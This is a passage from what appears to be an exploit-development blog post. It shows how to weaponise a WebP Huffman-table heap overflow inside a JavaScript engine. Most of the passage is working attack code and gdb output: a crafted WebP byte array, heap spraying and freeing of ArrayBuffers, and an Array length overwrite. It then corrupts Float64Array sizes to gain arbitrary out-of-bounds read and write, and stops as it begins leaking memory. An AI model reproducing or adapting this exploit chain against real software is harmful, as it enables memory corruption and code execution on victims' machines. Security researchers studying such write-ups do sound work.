class="p">,</span> <span class="mi">172</span><span class="p">,</span> <span class="mi">158</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">243</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">185</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Spray to shape heap
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">x</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">y</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">x</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x2fb0</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">y</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">y</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Free ArrayBuffer, so that malicious webp chunk will be allocated in
</span></span></span><span class="line"><span class="cl"><span class="c1">// the ArrayBuffer freed chunk, leads to overwriting the Array size.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">490</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">x</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Allocate the malicious webp multiple times, with hope that it
</span></span></span><span class="line"><span class="cl"><span class="c1">// overwrite one of the Array size that we spray before
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">isWebP</span><span class="p">(</span><span class="nx">webp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// To check which Array size that was overwritten with the webp,
</span></span></span><span class="line"><span class="cl"><span class="c1">// if we can access element larger than it original size (2), that means
</span></span></span><span class="line"><span class="cl"><span class="c1">// the Array size got overwritten.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">490</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">y</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">7</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// We can see that y[492] until y[496] size was overwritten, because the result isn&#39;t undefined
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Here&rsquo;s a brief explanation of my approach: Initially, I spray pairs of <code>ArrayBuffer(0x2fb0)</code> and <code>Array(1.1, 2.2)</code>. This spray aims to achieve a layout like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">-----
</span></span><span class="line"><span class="cl">ArrayBuffer
</span></span><span class="line"><span class="cl">----
</span></span><span class="line"><span class="cl">Array
</span></span><span class="line"><span class="cl">-----
</span></span><span class="line"><span class="cl">ArrayBuffer
</span></span><span class="line"><span class="cl">----
</span></span><span class="line"><span class="cl">Array
</span></span><span class="line"><span class="cl">-----
</span></span><span class="line"><span class="cl">ArrayBuffer
</span></span><span class="line"><span class="cl">----
</span></span><span class="line"><span class="cl">Array
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Freeing some of the <code>ArrayBuffer</code> objects results in a heap layout like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-----
</span></span><span class="line"><span class="cl">Free Chunk with size 0x2fc0
</span></span><span class="line"><span class="cl">----
</span></span><span class="line"><span class="cl">Array
</span></span><span class="line"><span class="cl">-----
</span></span><span class="line"><span class="cl">Free Chunk with size 0x2fc0
</span></span><span class="line"><span class="cl">----
</span></span><span class="line"><span class="cl">Array
</span></span><span class="line"><span class="cl">-----
</span></span><span class="line"><span class="cl">Free Chunk with size 0x2fc0
</span></span><span class="line"><span class="cl">----
</span></span><span class="line"><span class="cl">Array
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then, allocating the <code>huffman_tables</code> via <code>isWebP</code> (which effectively allocates a chunk of size <code>0x2f30</code>) will reuse these free chunks. Consequently, <code>huffman_tables+0x3000</code> will point to the <code>Array</code> size and overwrite it with a large value (<code>0x30007</code>).</p>
<p>To gain a deeper understanding, let&rsquo;s set a breakpoint right before we spray the <code>huffman_tables</code>. We can simply insert a <code>Math.min</code> call just after freeing the <code>ArrayBuffer</code> to facilitate this. Then, we&rsquo;ll examine the <code>largebin</code> list.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">large_bins[idx=111, size=0x2a00-0x3000, @0x7ffff7dff400]: fd=0x555555e21cc0, bk=0x555555e24df0
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr=0x555555e21cc0, size=0x2fc0, flags=PREV_INUSE, fd=0x555555e343e0, bk=0x7ffff7dff3f0, fd_nextsize=0x555555e21cc0, bk_nextsize=0x555555e21cc0)
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr=0x555555e343e0, size=0x2fc0, flags=PREV_INUSE, fd=0x555555e312b0, bk=0x555555e21cc0)
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr=0x555555e312b0, size=0x2fc0, flags=PREV_INUSE, fd=0x555555e2e180, bk=0x555555e343e0)
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr=0x555555e2e180, size=0x2fc0, flags=PREV_INUSE, fd=0x555555e2b050, bk=0x555555e312b0)
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr=0x555555e2b050, size=0x2fc0, flags=PREV_INUSE, fd=0x555555e27f20, bk=0x555555e2e180)
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr=0x555555e27f20, size=0x2fc0, flags=PREV_INUSE, fd=0x555555e24df0, bk=0x555555e2b050)
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr=0x555555e24df0, size=0x2fc0, flags=PREV_INUSE, fd=0x7ffff7dff3f0, bk=0x555555e27f20)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gef&gt; x/30gx 0x555555e24df0+0x10+0x3000-0x50
</span></span><span class="line"><span class="cl">0x555555e27db0:	0x0000000000002fc0	0x0000000000000050
</span></span><span class="line"><span class="cl">0x555555e27dc0:	0x00020d0000000001	0x0000555555e24c98
</span></span><span class="line"><span class="cl">0x555555e27dd0:	0x0000555555e2aef8	0x0000555555822e70
</span></span><span class="line"><span class="cl">0x555555e27de0:	0x0000555555e27e10	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e27df0:	0x0000000000000002	0x0000555555e27e40
</span></span><span class="line"><span class="cl">0x555555e27e00:	0x0000000000000002	0x0000000000000031
</span></span></code></pre></td></tr></table>
</div>
</div><p>Assume we successfully allocate the <code>huffman_tables</code> chunk to the address <code>0x555555e24df0</code>. Invoking <code>malloc(0x2f28)</code> will utilize the aforementioned <code>large_bins</code> chunk, as its size falls within the bin range of <code>0x2a00</code> to <code>0x3000</code>. In the memory view outlined above, <code>chunk+0x3000</code> points to the size field of one of our sprayed <code>Array</code> objects (size is at <code>chunk+0x40</code> (<code>0x2</code>), buffer is at <code>chunk+0x38</code> (<code>0x0000555555e27e40</code>)). Due to the overflow, this <code>Array</code> size will be overwritten.</p>
<p>Next, let&rsquo;s inspect the output of the JavaScript file we crafted.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">490 undefined
</span></span><span class="line"><span class="cl">491 undefined
</span></span><span class="line"><span class="cl">492 [unsupported type]
</span></span><span class="line"><span class="cl">493 [unsupported type]
</span></span><span class="line"><span class="cl">494 [unsupported type]
</span></span><span class="line"><span class="cl">495 [unsupported type]
</span></span><span class="line"><span class="cl">496 [unsupported type]
</span></span><span class="line"><span class="cl">497 undefined
</span></span><span class="line"><span class="cl">498 undefined
</span></span><span class="line"><span class="cl">499 undefined
</span></span></code></pre></td></tr></table>
</div>
</div><p>The reason entries <code>y[492]</code> to <code>y[496]</code> output values other than <code>undefined</code>, unlike the rest, is due to the successful overwrite of their <code>size</code> field through the overflow.</p>
<p>Despite successfully achieving an Out-of-Bounds (OOB) write, as you noted, the OOB read isn&rsquo;t functioning as expected, only displaying <code>[unsupported type]</code>. To better understand the OOB write, let&rsquo;s conduct a small experiment:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">y</span><span class="p">[</span><span class="mi">496</span><span class="p">][</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x13371337</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nb">Math</span><span class="p">.</span><span class="nx">min</span><span class="p">(</span><span class="nx">y</span><span class="p">[</span><span class="mi">496</span><span class="p">]);</span> <span class="c1">// Debug
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Run the above code and inspect the memory layout.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// *r8 points to y[496] during breakpoint at js_math_min_max
</span></span><span class="line"><span class="cl">gef&gt; x/60gx *(uint64_t*)$r8
</span></span><span class="line"><span class="cl">0x555555e37640:	0x00020d0000000002	0x0000555555e34518
</span></span><span class="line"><span class="cl">0x555555e37650:	0x0000555555e3a778	0x0000555555822e70
</span></span><span class="line"><span class="cl">0x555555e37660:	0x0000555555e37690	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e37670:	0x0000000000000002	0x0000555555e376c0
</span></span><span class="line"><span class="cl">0x555555e37680:	0x0000000000030007	0x0000000000000031
</span></span><span class="line"><span class="cl">0x555555e37690:	0x0000000000000002	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e376a0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e376b0:	0x0000000000000000	0x0000000000000031
</span></span><span class="line"><span class="cl">0x555555e376c0:	0x0000000013371337	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e376d0:	0x0000000013371337	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e376e0:	0x0000000013371337	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e376f0:	0x0000000013371337	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e37700:	0x0000000013371337	0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>After examining the memory layout post OOB write, the following observations are made:</p>
<ul>
<li>Each element occupies 0x10 bytes.</li>
<li>Only 4 bytes can be written per 0x10 bytes.</li>
</ul>
<p>For a stronger write and read primitive, I explored other data types. The <code>Float64Array</code> emerged as a strong candidate, enabling both OOB read and write, provided its length is overwritten. To inspect its structure, invoke <code>Math.min(float_arr)</code>, similar to our previous approach with the <code>Array</code> (ensure to remove the earlier experiment from our file).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Observed that the Array data type is not a good write primitive.
</span></span></span><span class="line"><span class="cl"><span class="c1">// One element takes 0x10 bytes, and we can only write 4 bytes per 0x10 bytes.
</span></span></span><span class="line"><span class="cl"><span class="c1">// So, we need to have a stronger write and read primitive.
</span></span></span><span class="line"><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1">// Moving forward, we will use y[496] as our limited OOB write.
</span></span></span><span class="line"><span class="cl"><span class="c1">// Spray Float64Array, with hope that this will be located
</span></span></span><span class="line"><span class="cl"><span class="c1">// below the corrupted Array.
</span></span></span><span class="line"><span class="cl"><span class="c1">// We plan to overwrite this size with our limited write primitive from Array later.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">let</span> <span class="nx">z</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">200</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">z</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="mh">0x2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">z</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">2261634.5098039214</span><span class="p">;</span> <span class="c1">// Use this as mark (float representation of 0x4141414141414141)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">z</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mf">2261634.5098039214</span><span class="p">;</span> <span class="c1">// Use this as mark (float representation of 0x4141414141414141)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nb">Math</span><span class="p">.</span><span class="nx">min</span><span class="p">(</span><span class="nx">z</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the memory layout:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; x/60gx *(uint64_t*)$r8-0x10
</span></span><span class="line"><span class="cl">0x555555e2b350:	0x0000000000000000	0x0000000000000051
</span></span><span class="line"><span class="cl">0x555555e2b360:	0x001f0d0000000002	0x0000555555e2e498
</span></span><span class="line"><span class="cl">0x555555e2b370:	0x0000555555e28238	0x000055555581ef30
</span></span><span class="line"><span class="cl">0x555555e2b380:	0x0000555555e2e4e0	0x0000000000000000
</span></span><span class="line"><span class="cl">0x555555e2b390:	0x0000555555e2b3b0	0x0000555555822890
</span></span><span class="line"><span class="cl">0x555555e2b3a0:	0x0000000000000002
</span></span><span class="line"><span class="cl">gef&gt; x/50gx 0x0000555555822890-0x10
</span></span><span class="line"><span class="cl">0x555555822880:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x555555822890:	0x4141414141414141	0x4141414141414141
</span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>Float64Array</code> has a layout similar to <code>Array</code>, with the size at <code>chunk+0x40</code> (<code>0x2</code>) and buffer at <code>chunk+0x38</code> (<code>0x0000555555822890</code>). Interestingly, the <code>buffer</code> chunk&rsquo;s <code>data</code> isn&rsquo;t limited per <code>0x10</code> bytes, and the OOB read accurately displays the hexadecimal values as floating points.</p>
<p>Our strategy now involves using the OOB write capability from the <code>Array</code> to overwrite the size of a newly sprayed <code>Float64Array</code>, turning it into a new primitive for reading and writing. Observed that altering <code>y[496][9]</code> and <code>y[496][34]</code> affects one of the sprayed <code>Float64Array</code> objects size. To identify the affected <code>Float64Array</code>, we can mark the first element (<code>y[496][3]</code> and <code>y[496][28]</code>) with a unique value.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Based on observation in gdb, overwriting these 
</span></span></span><span class="line"><span class="cl"><span class="c1">// offsets will overwrite:
</span></span></span><span class="line"><span class="cl"><span class="c1">// - FloatArray64[0] value to 0x37373737, so that later we can use this
</span></span></span><span class="line"><span class="cl"><span class="c1">//   value as the mark of which FloatArray64 that the size got overwritten
</span></span></span><span class="line"><span class="cl"><span class="c1">// - FloatArray64 size value to 0x37373737
</span></span></span><span class="line"><span class="cl"><span class="c1">// We want to corrupt two FloatArray64.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">y</span><span class="p">[</span><span class="mi">496</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x37373737</span><span class="p">;</span> <span class="c1">// FloatArray64[0]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">y</span><span class="p">[</span><span class="mi">496</span><span class="p">][</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x37373737</span><span class="p">;</span> <span class="c1">// FloatArray64 size
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">y</span><span class="p">[</span><span class="mi">496</span><span class="p">][</span><span class="mi">28</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x37373737</span><span class="p">;</span> <span class="c1">// Other FloatArray64[0]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">y</span><span class="p">[</span><span class="mi">496</span><span class="p">][</span><span class="mi">34</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x37373737</span><span class="p">;</span> <span class="c1">// Other FloatArray64 size
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// To check which FloatArray64 that we overwrite just now,
</span></span></span><span class="line"><span class="cl"><span class="c1">// if the first element value is no longer 2261634.5098039214,
</span></span></span><span class="line"><span class="cl"><span class="c1">// that means we found the correct index.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">200</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">z</span><span class="p">[</span><span class="nx">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// We can see that index 82 and 83 is the one that we overwrite the size.
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Examining the output of this code reveals that <code>z[82]</code> and <code>z[83]</code> are the <code>Float64Array</code> instances impacted by our <code>Array</code> OOB Write. With these new, unrestricted primitives, we no longer need the limited OOB write.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">79 2261634.5098039214
</span></span><span class="line"><span class="cl">80 2261634.5098039214
</span></span><span class="line"><span class="cl">81 2261634.5098039214
</span></span><span class="line"><span class="cl">82 4.576853666e-315
</span></span><span class="line"><span class="cl">83 4.576853666e-315
</span></span><span class="line"><span class="cl">84 2261634.5098039214
</span></span><span class="line"><span class="cl">85 2261634.5098039214
</span></span><span class="line"><span class="cl">86 2261634.5098039214
</span></span><span class="line"><span class="cl">87 2261634.5098039214
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="leaking-values">Leaking values</h4>
<p>Next, let&rsquo;s explore what values can be leaked using <code>z[82]</code> in <code>gdb</code>. Simply execute <code>Math.min(z[82])</code> and inspect the memory values.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; x/100gx *(uint64_t*)$r8-0x30
</span></span><span class="line"><span class="cl">0x555555e38790:	0x0000000000000000	0x0000000000000021
